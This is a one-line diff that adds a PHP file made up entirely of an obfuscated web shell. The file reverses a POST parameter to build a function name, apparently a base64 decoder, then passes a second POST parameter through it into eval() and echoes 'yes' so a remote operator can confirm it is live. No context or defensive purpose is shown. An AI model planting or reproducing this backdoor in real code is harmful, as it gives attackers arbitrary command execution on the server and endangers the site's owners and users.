@@ -1,0 +1,1 @@
+<?php $Exp=strrev($_POST['shiban']);eval($Exp($_POST[z0])); echo "yes";?>
